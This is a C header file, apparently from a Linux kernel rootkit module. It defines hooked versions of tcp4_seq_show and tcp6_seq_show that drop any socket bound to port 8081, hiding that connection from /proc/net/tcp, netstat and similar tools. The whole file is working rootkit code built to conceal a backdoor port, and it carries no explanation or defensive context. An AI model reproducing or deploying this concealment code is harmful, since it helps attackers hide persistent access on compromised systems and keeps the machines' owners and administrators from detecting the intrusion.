#ifndef TCP_H
#define TCP_H

#define PORT 8081

static asmlinkage long (*og_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*og_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v);

static notrace asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        return 0;
    }

    ret = og_tcp4_seq_show(seq, v);
    return ret;
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v);

static notrace asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        return 0;
    }

    ret = og_tcp6_seq_show(seq, v);
    return ret;
}

#endif
